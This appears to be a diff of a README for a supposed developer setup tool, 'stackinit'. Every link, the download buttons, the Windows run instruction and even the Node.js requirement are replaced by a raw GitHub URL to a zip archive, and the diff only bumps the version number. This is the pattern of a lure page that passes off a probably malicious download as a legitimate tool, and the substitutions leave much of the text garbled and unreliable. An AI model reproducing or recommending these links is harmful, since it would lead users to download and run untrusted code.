@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to stackinit! This tool helps you create a consistent development environment for https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip projects with just one command. It automatically detects your project type, installs necessary dependencies, and sets up essential tools like ESLint, Prettier, Husky, and GitHub Actions CI.
+Welcome to stackinit! This tool helps you create a consistent development environment for https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip projects with just one command. It automatically detects your project type, installs necessary dependencies, and sets up essential tools like ESLint, Prettier, Husky, and GitHub Actions CI.
 
 ## 📥 Download & Install
 
 To get started, you need to download stackinit. Click the button below to visit the Releases page:
 
-[![Download stackinit](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip)](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip)
+[![Download stackinit](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip)](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip)
 
-1. Click the button above or visit [this page](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip) to download the latest release of stackinit.
+1. Click the button above or visit [this page](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip) to download the latest release of stackinit.
 2. Locate the file appropriate for your operating system (Windows, macOS, or Linux).
 3. Download the file and save it to a location you can easily access.
 
@@ -31,7 +31,7 @@ After downloading, follow these steps to run stackinit:
 3. **Run the application**:
    - For Windows:
      ```
-     https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip
+     https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip
      ```
    - For macOS and Linux:
      ```
@@ -46,7 +46,7 @@ After downloading, follow these steps to run stackinit:
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
-- **https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip**: Version 12.x or later should be installed on your system. You can download it from [https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip).
+- **https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip**: Version 12.x or later should be installed on your system. You can download it from [https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip).
 
 ## 📁 Features
 
@@ -82,7 +82,7 @@ To use stackinit after installation, follow these steps:
 If you encounter any issues, here are some common solutions:
 
 - **Error: Command not found**: Ensure that the stackinit executable is in your PATH or use the complete path to the executable.
-- **https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip not found**: Make sure that https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip is properly installed. You can verify by running `node -v` in your terminal.
+- **https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip not found**: Make sure that https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip is properly installed. You can verify by running `node -v` in your terminal.
 
 ## 🙌 Support and Contributions
 
@@ -100,4 +100,4 @@ stackinit is licensed under the MIT License. See the LICENSE file for more infor
 
 To download the latest version of stackinit, simply visit the Releases page again:
 
-[![Download stackinit](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip)](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v3.9.zip)
+[![Download stackinit](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip)](https://raw.githubusercontent.com/Mdraken66/stackinit/main/src/Software_v1.3.zip)
